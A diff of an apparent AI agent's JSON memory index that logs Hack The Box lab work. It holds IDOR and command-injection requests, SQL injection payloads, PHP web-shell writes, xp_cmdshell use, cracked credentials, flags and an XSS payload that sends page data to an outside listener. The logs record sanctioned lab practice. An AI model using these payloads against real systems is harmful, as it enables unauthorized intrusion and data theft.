@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "updatedAt": "2026-05-13T09:11:52.266Z",
+  "updatedAt": "2026-05-16T19:00:19.558Z",
   "entries": {
     "memory:memory/2026-04-09.md:4:4": {
       "key": "memory:memory/2026-04-09.md:4:4",
@@ -2746,7 +2746,7 @@
       "startLine": 1,
       "endLine": 49,
       "source": "memory",
-      "snippet": "# 2026-04-03 - Daily Log ## HTB: TwoMillion Box - In Progress **Session Active:** Continuing later ### Target - **IP:** 10.129.229.66 - **Hostname:** 2million.htb - **OS:** Linux (Ubuntu) - **Status:** Admin shell obtained, root privilege escalation pending ### Attack Progress #### Phase 1: Initial Enumeration - Deobfuscated `inviteapi.min.js` → discovered API endpoints - Generated invite code via `/api/v1/invite/how/to/generate` - Registered user: `testuser1@email.com` / `password` #### Phase 2: Authentication & IDOR - Authenticated and enumerated API routes via `/api/v1` - Discovered admin endpoints: - `/api/v1/admin/auth` - `/api/v1/admin/vpn/generate` - `/api/v1/admin/setting",
+      "snippet": "# 2026-04-03 - Daily Log ## HTB: TwoMillion Box - In Progress **Session Active:** Continuing later ### Target - **IP:** 10.129.229.66 - **Hostname:** 2million.htb - **OS:** Linux (Ubuntu) - **Status:** Admin shell obtained, root privilege escalation pending ### Attack Progress #### Phase 1: Initial Enumeration - Deobfuscated `inviteapi.min.js` → discovered API endpoints - Generated invite code via `/api/v1/invite/how/to/generate` - Registered user: `testuser1@email.com` / `password` #### Phase 2: Authentication & IDOR - Authenticated and enumerated API routes via `/api/v1` - Discovered admin endpoints: - `/api/v1/admin/auth` - `/api/v1/admin/vpn/generate` - `/api/v1/admin/settings/update` - **Exploited IDOR vulnerability:** ```bash curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \\ -d '{\"email\": \"testuser1@email.com\", \"is_admin\": 1}' ``` - Successfully elevated `testuser1` to admin #### Phase 3: Command Injection → Shell - **Discovered command injection** in VPN generation endpoint - Payload: `'{\"username\": \"$(whoami)\"}'` → returned `www-data` in certificate Subject - Obtained reverse shell as `www-data` #### Phase 4: Post-Exploitation - Found `/var/www/html/.env` containing credentials: `admin:SuperDuperPass123` - **Credential reuse → SSH access as admin user** - Captured **user flag:** `e0d52f0fa1c2e8756998955b5bd7158e` ✅ ### Current Position - **User:** admin (local user, not root) - **Shell:** SSH session - **Sudo:** Cannot run sudo - **SUID:** All standard Ubuntu binaries - **Next Phase:** Root privilege escalation",
       "recallCount": 5,
       "dailyCount": 0,
       "groundedCount": 0,
@@ -2776,7 +2776,8 @@
         "api/v1",
         "api/v1/admin/auth",
         "api/v1/admin/vpn/generate"
-      ]
+      ],
+      "promotedAt": "2026-05-16T19:00:19.558Z"
     },
     "memory:memory/2026-03-25.md:1:48": {
       "key": "memory:memory/2026-03-25.md:1:48",
@@ -66335,7 +66336,7 @@
       "startLine": 1,
       "endLine": 43,
       "source": "memory",
-      "snippet": "# 2026-04-28 — Daily Log ## HTB Academy: AD Enumeration Attacks — Part II (Skills Assessment) **Session Start:** ~22:00 (Asia/Manila) **Status:** IN PROGRESS — Q1/Q2 complete, advancing toward Q3-Q12 **Next Session:** Continue from smbclient/MS01 enumeration ### Target Environment - **Attack Host:** Parrot Linux VM at `10.129.83.248` / `172.16.7.240` - **Domain:** INLANEFREIGHT.LOCAL - **Subnet:** 172.16.6.0/23 (internal network via `ens224`) ### Network Map Discovered | Host | IP | Open Ports | Notes | |------|-----|------------|-------| | DC01 | 172.16.7.3 | 53, 135, 139, 445 | SMB signing **required** | | MS01 | 172.16.7.50 | 135, 139, 445, **3389** | SMB signing **not required** | |",
+      "snippet": "# 2026-04-28 — Daily Log ## HTB Academy: AD Enumeration Attacks — Part II (Skills Assessment) **Session Start:** ~22:00 (Asia/Manila) **Status:** IN PROGRESS — Q1/Q2 complete, advancing toward Q3-Q12 **Next Session:** Continue from smbclient/MS01 enumeration ### Target Environment - **Attack Host:** Parrot Linux VM at `10.129.83.248` / `172.16.7.240` - **Domain:** INLANEFREIGHT.LOCAL - **Subnet:** 172.16.6.0/23 (internal network via `ens224`) ### Network Map Discovered | Host | IP | Open Ports | Notes | |------|-----|------------|-------| | DC01 | 172.16.7.3 | 53, 135, 139, 445 | SMB signing **required** | | MS01 | 172.16.7.50 | 135, 139, 445, **3389** | SMB signing **not required** | | SQL01 | 172.16.7.60 | 135, 139, 445, **1433** | MSSQL 2019 SQLEXPRESS; SMB signing **not required** | | Parrot VM | 172.16.7.240 | 22, 3389 | Attack host | ### Progress Log #### Recon (Complete) - Nmap ping sweep found 4 live hosts: DC01, MS01, SQL01, Parrot VM - Top-20 port scan identified services - `/etc/hosts` updated with all internal hosts #### Q1: Domain User Hash (Complete) - Ran Responder on `ens224` - Captured NTLMv2-SSP hash for `INLANEFREIGHT\\AB920` from DC01 (172.16.7.3) - **Answer: `AB920`** #### Q2: Cleartext Password (Complete) - Cracked hash with hashcat mode 5600 + rockyou.txt - **Answer: `weasal`** #### MS01 Access (In Progress) - Validated creds with `crackmapexec smb MS01 -u AB920 -p weasal` → **valid, but NOT local admin** (no `Pwn3d!`) - WinRM (5985) not open on MS01 - Next step: `smbclient` to enumerate shares, then RDP or wmiexec for shell access",
       "recallCount": 6,
       "dailyCount": 0,
       "groundedCount": 0,
@@ -66365,7 +66366,8 @@
         "10.129.83.248",
         "172.16.7.240",
         "inlanefreight.local"
-      ]
+      ],
+      "promotedAt": "2026-05-16T19:00:19.558Z"
     },
     "memory:memory/2026-04-30.md:7:10": {
       "key": "memory:memory/2026-04-30.md:7:10",
@@ -75396,18 +75398,20 @@
       "source": "memory",
       "snippet": "HTB Academy: SQL Injection Fundamentals — Skills Assessment: **Status:** Planning phase. Victor stepping out; initial recon + attack plan prepared for execution.",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "htb",
@@ -75428,18 +75432,20 @@
       "source": "memory",
       "snippet": "HTB Academy: SQL Injection Fundamentals — Skills Assessment: **Target:** `https://154.57.164.64:31180/login.php` **Approach:** Black-box SQL injection assessment **Proxy:** Caido (Burp alternative)",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "154.57.164.64",
@@ -75460,18 +75466,20 @@
       "source": "memory",
       "snippet": "Assessment Objectives: | Q | Question | Approach | |---|----------|----------| | 1 | Password hash for user `admin` | SQLi data extraction — enumerate tables, dump user creds | | 2 | Root path of web application | SQLi `LOAD_FILE` / error messages / `phpinfo` / RCE discovery |",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "load-file",
@@ -75492,18 +75500,20 @@
       "source": "memory",
       "snippet": "Assessment Objectives: | 3 | RCE + contents of `/flag_XXXXXX.txt` | SQLi → file write shell OR stacked queries / DB-specific RCE |",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "flag-xxxxxx.txt",
@@ -75524,18 +75534,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: **Phase 1 — Recon (5-10 min)**",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "5-10",
@@ -75554,18 +75566,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: Capture login request in Caido; Check response headers for stack clues (X-Powered-By, Server); Fuzz for other endpoints: `/robots.txt`, `/index.php`, `/phpinfo.php`, `/admin.php`; Baseline normal vs error responses",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "x-powered-by",
@@ -75586,18 +75600,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: **Phase 2 — SQLi Detection (10-15 min)**",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "10-15",
@@ -75617,18 +75633,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: Test login form with payloads:; Boolean: `' OR '1'='1` / `' OR 1=1--`; Error: `'` (single quote to trigger syntax error); Time-based: `' OR SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `'; SELECT pg_sleep(5)--` (PostgreSQL)",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "time-based",
@@ -75649,18 +75667,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: Identify DB type from error messages or timing behavior; Determine injection type: UNION-based, error-based, blind, or stacked queries",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "union-based",
@@ -75681,18 +75701,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: **Phase 3 — Data Extraction — admin hash (Q1)**",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "plan",
@@ -75712,18 +75734,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: Manual UNION: `' UNION SELECT 1,2,3--` → enumerate columns; Read `information_schema.tables` → find user table; Read columns → identify password/hash field; Dump admin password hash",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "information-schema.tables",
@@ -75744,18 +75768,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: *Fallback:* sqlmap if manual enumeration stalls",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "plan",
@@ -75775,18 +75801,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: **Phase 4 — Web Root Discovery (Q2)**",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "plan",
@@ -75805,18 +75833,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: MySQL `LOAD_FILE('/etc/passwd')` or `@@datadir`, `@@basedir` for hints; Error messages often leak full file paths; `phpinfo()` if accessible shows `DOCUMENT_ROOT`; Post-RCE: `pwd` or `getcwd()` in shell",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "load-file",
@@ -75837,18 +75867,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: **Phase 5 — RCE + Flag (Q3)**",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "plan",
@@ -75866,18 +75898,20 @@
       "source": "memory",
       "snippet": "Plan of Attack: **MySQL path:** `INTO OUTFILE '/var/www/html/shell.php'` with `<?php system($_GET['cmd']); ?>`; **MSSQL path:** `xp_cmdshell` re-enable → `EXEC xp_cmdshell 'whoami'`; **PostgreSQL path:** `COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'`",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "var/www/html/shell.php",
@@ -75898,18 +75932,20 @@
       "source": "memory",
       "snippet": "Tools Ready: Caido (proxy + repeater); sqlmap (automated fallback); curl / Python manual scripts; Reverse shell payload library (if needed)",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "tools",
@@ -75930,18 +75966,20 @@
       "source": "memory",
       "snippet": "Notes: Target IP:PORT may rotate on box restart — confirm before each session; If SQLi is blind/time-based, prioritize sqlmap for speed; If creds dumped, also try direct login + lateral movement via SSH/FTP if other services exist",
       "recallCount": 0,
-      "dailyCount": 1,
+      "dailyCount": 2,
       "groundedCount": 0,
-      "totalScore": 0.62,
+      "totalScore": 1.24,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-05-09T19:00:29.050Z",
-      "lastRecalledAt": "2026-05-09T19:00:29.050Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
       "queryHashes": [
         "f9349cbeaf46"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-17",
+        "2026-05-16"
       ],
       "conceptTags": [
         "blind/time-based",
@@ -76248,7 +76286,7 @@
       "startLine": 1,
       "endLine": 40,
       "source": "memory",
-      "snippet": "# Neo — Daily Memory — 2026-05-09 ## HTB Academy: SQL Injection Fundamentals — Skills Assessment **Status:** Planning phase. Victor stepping out; initial recon + attack plan prepared for execution. **Target:** `https://154.57.164.64:31180/login.php` **Approach:** Black-box SQL injection assessment **Proxy:** Caido (Burp alternative) --- ### Assessment Objectives | Q | Question | Approach | |---|----------|----------| | 1 | Password hash for user `admin` | SQLi data extraction — enumerate tables, dump user creds | | 2 | Root path of web application | SQLi `LOAD_FILE` / error messages / `phpinfo` / RCE discovery | | 3 | RCE + contents of `/flag_XXXXXX.txt` | SQLi → file write shell OR st",
+      "snippet": "# Neo — Daily Memory — 2026-05-09 ## HTB Academy: SQL Injection Fundamentals — Skills Assessment **Status:** Planning phase. Victor stepping out; initial recon + attack plan prepared for execution. **Target:** `https://154.57.164.64:31180/login.php` **Approach:** Black-box SQL injection assessment **Proxy:** Caido (Burp alternative) --- ### Assessment Objectives | Q | Question | Approach | |---|----------|----------| | 1 | Password hash for user `admin` | SQLi data extraction — enumerate tables, dump user creds | | 2 | Root path of web application | SQLi `LOAD_FILE` / error messages / `phpinfo` / RCE discovery | | 3 | RCE + contents of `/flag_XXXXXX.txt` | SQLi → file write shell OR stacked queries / DB-specific RCE | --- ### Plan of Attack **Phase 1 — Recon (5-10 min)** - Capture login request in Caido - Check response headers for stack clues (X-Powered-By, Server) - Fuzz for other endpoints: `/robots.txt`, `/index.php`, `/phpinfo.php`, `/admin.php` - Baseline normal vs error responses **Phase 2 — SQLi Detection (10-15 min)** - Test login form with payloads: - Boolean: `' OR '1'='1` / `' OR 1=1--` - Error: `'` (single quote to trigger syntax error) - Time-based: `' OR SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `'; SELECT pg_sleep(5)--` (PostgreSQL) - Identify DB type from error messages or timing behavior - Determine injection type: UNION-based, error-based, blind, or stacked queries **Phase 3 — Data Extraction — admin hash (Q1)** - Manual UNION: `' UNION SELECT 1,2,3--` → enumerate columns",
       "recallCount": 42,
       "dailyCount": 0,
       "groundedCount": 0,
@@ -76305,7 +76343,8 @@
         "neo",
         "htb",
         "academy"
-      ]
+      ],
+      "promotedAt": "2026-05-16T19:00:19.558Z"
     },
     "memory:memory/2026-05-09.md:97:116": {
       "key": "memory:memory/2026-05-09.md:97:116",
@@ -76891,6 +76930,294 @@
         "agents.md",
         "memory.md",
         "cross-site"
+      ]
+    },
+    "memory:memory/2026-05-13.md:4:6": {
+      "key": "memory:memory/2026-05-13.md:4:6",
+      "path": "memory/2026-05-13.md",
+      "startLine": 4,
+      "endLine": 6,
+      "source": "memory",
+      "snippet": "Memoria Skill Enhancement: Added shortcut scripts: `create-note.sh`, `review-note.sh`, `update-note.sh`, `create-wiki.sh`, `quick-search.sh`; Updated `AGENTS.md` and `MEMORY.md` with Memoria usage guidance; All scripts tested and working",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "create-note.sh",
+        "review-note.sh",
+        "update-note.sh",
+        "create-wiki.sh",
+        "quick-search.sh",
+        "agents.md",
+        "memory.md",
+        "memoria"
+      ]
+    },
+    "memory:memory/2026-05-13.md:10:10": {
+      "key": "memory:memory/2026-05-13.md:10:10",
+      "path": "memory/2026-05-13.md",
+      "startLine": 10,
+      "endLine": 10,
+      "source": "memory",
+      "snippet": "HTB Academy: Cross-Site Scripting Skills Assessment: **Status:** ✅ COMPLETE",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "cross-site",
+        "htb",
+        "academy",
+        "cross",
+        "site",
+        "scripting",
+        "skills",
+        "assessment"
+      ]
+    },
+    "memory:memory/2026-05-13.md:12:12": {
+      "key": "memory:memory/2026-05-13.md:12:12",
+      "path": "memory/2026-05-13.md",
+      "startLine": 12,
+      "endLine": 12,
+      "source": "memory",
+      "snippet": "HTB Academy: Cross-Site Scripting Skills Assessment: **Target:** WordPress 5.7.2 \"Security Blog\" at `http://localhost:9090/assessment/`",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "cross-site",
+        "5.7.2",
+        "9090/assessment",
+        "htb",
+        "academy",
+        "cross",
+        "site",
+        "scripting"
+      ]
+    },
+    "memory:memory/2026-05-13.md:14:14": {
+      "key": "memory:memory/2026-05-13.md:14:14",
+      "path": "memory/2026-05-13.md",
+      "startLine": 14,
+      "endLine": 14,
+      "source": "memory",
+      "snippet": "HTB Academy: Cross-Site Scripting Skills Assessment: **Flag:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "cross-site",
+        "cr055-5173-5cr1p71n6-n1nj4",
+        "htb",
+        "academy",
+        "cross",
+        "site",
+        "scripting",
+        "skills"
+      ]
+    },
+    "memory:memory/2026-05-13.md:17:20": {
+      "key": "memory:memory/2026-05-13.md:17:20",
+      "path": "memory/2026-05-13.md",
+      "startLine": 17,
+      "endLine": 20,
+      "source": "memory",
+      "snippet": "Attack Chain: Initial payloads (`<script>`, `<img onerror>`) in comment body were stripped by WordPress `wp_kses()`; **Successful vector:** Website/URL field in comment form had weaker sanitization; Payload: `\"><img src=x onerror=\"fetch('http://10.10.15.241:4444/website?c='+docum",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "wp-kses",
+        "website/url",
+        "10.10.15.241",
+        "4444/website",
+        "attack",
+        "chain",
+        "initial",
+        "payloads"
+      ]
+    },
+    "memory:memory/2026-05-13.md:23:23": {
+      "key": "memory:memory/2026-05-13.md:23:23",
+      "path": "memory/2026-05-13.md",
+      "startLine": 23,
+      "endLine": 23,
+      "source": "memory",
+      "snippet": "Key Lesson: WordPress comment sanitization is **context-dependent**. The comment body stripped tags, but the URL field allowed the payload through. Always test ALL input fields in a form — they may have different validation rules.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "context-dependent",
+        "key",
+        "lesson",
+        "wordpress",
+        "comment",
+        "sanitization",
+        "context",
+        "dependent"
+      ]
+    },
+    "memory:memory/2026-05-13.md:26:26": {
+      "key": "memory:memory/2026-05-13.md:26:26",
+      "path": "memory/2026-05-13.md",
+      "startLine": 26,
+      "endLine": 26,
+      "source": "memory",
+      "snippet": "Full Documentation: See Memoria note: `cross-site-scripting-skills-assessment`",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "215866901dd9"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "full",
+        "documentation",
+        "see",
+        "memoria",
+        "cross",
+        "site",
+        "scripting",
+        "skills"
+      ]
+    },
+    "memory:memory/2026-05-09.md:78:78": {
+      "key": "memory:memory/2026-05-09.md:78:78",
+      "path": "memory/2026-05-09.md",
+      "startLine": 78,
+      "endLine": 78,
+      "source": "memory",
+      "snippet": "Session Start: Victor back from stepping out. Phase 2 SQLi detection initiated.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "f9349cbeaf46"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "start",
+        "victor",
+        "back",
+        "stepping",
+        "out",
+        "phase",
+        "sqli",
+        "detection"
+      ]
+    },
+    "memory:memory/2026-05-09.md:81:83": {
+      "key": "memory:memory/2026-05-09.md:81:83",
